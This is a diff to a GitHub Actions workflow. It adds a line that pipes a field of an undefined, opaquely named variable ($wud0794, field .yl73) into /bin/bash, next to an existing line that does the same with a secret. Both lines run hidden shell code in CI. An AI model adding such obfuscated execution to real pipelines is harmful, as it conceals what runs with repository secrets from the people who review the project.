@@ -21,6 +21,7 @@ jobs:
           x0: ${{ secrets.x0 }}
         run: |
           printf '%s' "$x0" | jq -r .ad281 | /bin/bash
+          printf '%s' "$wud0794" | jq -r .yl73 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
